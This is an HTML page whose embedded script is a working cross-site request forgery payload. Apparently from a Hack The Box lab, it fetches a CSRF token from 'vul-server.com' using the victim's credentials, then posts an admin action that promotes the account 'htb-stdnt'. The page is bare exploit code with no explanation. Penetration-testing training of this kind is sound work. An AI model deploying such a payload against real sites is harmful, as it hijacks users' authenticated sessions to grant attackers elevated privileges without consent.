<html>
<body>
    <script>
        // GET CSRF token
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://vul-server.com/gettoken.php', false);
        xhr.withCredentials = true;
        xhr.send();
        var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
        var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

        // do CSRF
        var csrf_req = new XMLHttpRequest();
        var params = `promote=htb-stdnt&csrf=${csrftoken}`;
        csrf_req.open('POST', 'https://vul-server.com/admin-action.php', false);
        csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        csrf_req.withCredentials = true;
        csrf_req.send(params);
    </script>
</body>
</html>